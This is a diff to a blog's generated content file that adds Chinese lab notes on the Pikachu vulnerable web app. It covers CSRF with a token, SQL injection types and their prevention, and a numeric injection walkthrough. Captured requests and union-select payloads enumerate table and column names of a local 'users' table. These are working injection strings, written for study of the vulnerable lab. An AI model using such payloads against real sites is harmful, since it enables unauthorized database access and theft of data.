@@ -2371,7 +2371,72 @@ ed-1=x*\phi(n)</script><p>如果我们已知p,q的位数，那就大概知道n�
 <li>点击按钮，信息被成功修改</li>
 </ul>
 <p><img src="/2021/06/07/pikachuRecord/image-20210611113054183.png" alt="image-20210611113054183" style="zoom:80%;"></p>
-<h3 id="3-3-CSRF-Token-login"><a href="#3-3-CSRF-Token-login" class="headerlink" title="3.3 CSRF Token login"></a>3.3 CSRF Token login</h3>]]></content>
+<h3 id="3-3-CSRF-Token-login"><a href="#3-3-CSRF-Token-login" class="headerlink" title="3.3 CSRF Token login"></a>3.3 CSRF Token login</h3><ul>
+<li>首先登录 lili/123456，然后修改个人信息，用 BP 截获</li>
+</ul>
+<p><img src="/2021/06/07/pikachuRecord/image-20210615225321492.png" alt="image-20210615225321492" style="zoom:80%;"></p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=0&amp;phonenum=0&amp;add=0&amp;email=0&amp;token=7161660c8beacb171d715542422&amp;submit=submit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/csrf/csrftoken/token_get_edit.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lfobrlou9i3bel3q9bbsbkvmd9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里与上文 CSRF(get) login 区别在于，这里是带 token 的，由于 token 是随机的，所以这里我们无法和上文一样构造 URL 让用户点击完成信息修改了。</li>
+</ul>
+<h2 id="4-SQL-注入"><a href="#4-SQL-注入" class="headerlink" title="4 SQL 注入"></a>4 SQL 注入</h2><h3 id="先验知识-3"><a href="#先验知识-3" class="headerlink" title="先验知识"></a>先验知识</h3><h4 id="形成的原因"><a href="#形成的原因" class="headerlink" title="形成的原因"></a>形成的原因</h4><p>前端数据传到后台处理时，未做严格过滤，导致传入的数据拼接到 SQL 语句后，被执行</p>
+<h4 id="常见注入方法"><a href="#常见注入方法" class="headerlink" title="常见注入方法"></a>常见注入方法</h4><ul>
+<li>UNION 注入<ul>
+<li>方法：使用 UNION 语句把数据展示到页面</li>
+</ul>
+</li>
+<li>报错注入<ul>
+<li>方法：利用 MySQL 执行后的报错信息</li>
+</ul>
+</li>
+<li>布尔盲注<ul>
+<li>方法：看不到直接的数据，但是可以通过注入，看页面是否有变化来推测出数据。</li>
+<li>案例：比如在参数后添加类似 <code>and 1=1</code> 这种，如果页面正常返回，说明 <code>and</code> 是成功执行的，那这个参数就存在 SQL 注入漏洞</li>
+</ul>
+</li>
+<li>时间盲注<ul>
+<li>方法：通过 sleep() 函数，利用 IF 函数或 AND OR 的短路特性和执行时间判断 SQL 攻击的结果</li>
+<li>案例：<code>id=&#39;1&#39; or sleep(1);</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="如何避免-1"><a href="#如何避免-1" class="headerlink" title="如何避免"></a>如何避免</h4><ul>
+<li>使用预编译语句，绑定变量</li>
+<li>检查数据类型（比如邮箱，日期等按严格的格式输入）</li>
+<li>使用安全的编码函数（比如 OWASP ESAPI 中实现的encodeForSQL）</li>
+</ul>
+<h3 id="4-1-数字型注入"><a href="#4-1-数字型注入" class="headerlink" title="4.1 数字型注入"></a>4.1 数字型注入</h3><ul>
+<li>选择任一数字，点击查询，发现 URL 并未出现对应的参数，所以应该是通过 POST 传参</li>
+</ul>
+<p><img src="/2021/06/07/pikachuRecord/image-20210615230701375.png" alt="image-20210615230701375" style="zoom:80%;"></p>
+<ul>
+<li>用 BurpSuite 截获数据包</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pikachu/vul/sqli/sqli_id.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8081</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8081</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8081/pikachu/vul/sqli/sqli_id.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=94ocsnqcobv4btt7s7mv638b7i</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">id</span>=<span class="number">1</span>&amp;submit=%E<span class="number">6</span>%<span class="number">9</span>F%A<span class="number">5</span>%E<span class="number">8</span>%AF%A<span class="number">2</span></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>CTRL + R</code> 发送到 Repeater 发送，得到响应</li>
+</ul>
+<p><img src="/2021/06/07/pikachuRecord/image-20210615230926001.png" alt="image-20210615230926001"></p>
+<ul>
+<li>改参数 <code>id=2</code> 重发一次，结果为</li>
+</ul>
+<p><img src="/2021/06/07/pikachuRecord/image-20210615231018613.png" alt="image-20210615231018613"></p>
+<ul>
+<li><code>id=2-1</code> 重发，结果为</li>
+</ul>
+<p><img src="/2021/06/07/pikachuRecord/image-20210615231344694.png" alt="image-20210615231344694"></p>
+<ul>
+<li>所以，是进行数值运算的，因此存在数字型注入</li>
+<li>通过联合查询，查询数据库所有表名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/07/pikachuRecord/image-20210615231929918.png" alt="image-20210615231929918"></p>
+<ul>
+<li>查询 <code>users</code> 对应字段名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/06/07/pikachuRecord/image-20210615232221004.png" alt="image-20210615232221004"></p>
+]]></content>
       <categories>
         <category>笔记</category>
       </categories>
